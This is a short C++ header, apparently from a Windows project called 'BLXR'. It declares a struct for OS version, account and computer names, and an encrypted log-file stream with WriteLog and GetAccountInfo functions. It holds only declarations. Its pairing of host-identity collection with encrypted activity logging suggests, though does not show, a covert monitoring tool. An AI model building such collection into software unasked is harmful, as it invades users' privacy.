#ifndef BLXR__STREAM_H_
#define BLXR__STREAM_H_

#include <filesystem>
#include <fstream>
#include <sstream>
#include <rpc.h>
#include <lmcons.h>

#include "helper.h"
#include "encrypt.h"

struct ClientInfo {
  OSVERSIONINFO osVersionInfo{};
  char accountName[UNLEN + 1];
  char *computerName[UNLEN + 1];
  uint32_t activeProcess = 0x0;

} static clientInfo, *pClientInfo;

namespace Stream {
class LogFile {
 public:
  std::ofstream Ofstream;
  std::string Name;
  std::string Path;
  std::string PathFull;

  LogFile(const std::string &path, const std::string &name) : Ofstream(path + name, std::fstream::in),
															  Path(path),
															  Name(name),
															  PathFull(path + name) {}
};

std::string GetPath(const std::string &dir = "");
bool MakeDir(const std::string &path);
bool MakeFile();
bool WriteLog(const std::string &input, uint32_t &active, bool blockProcessInfo = false);
void GetAccountInfo(ClientInfo *data);
std::vector<std::filesystem::path> GetAllFilesInFolder(const std::string &firstFile);

static Stream::LogFile *logFile;
}

#endif //BLXR__STREAM_H_
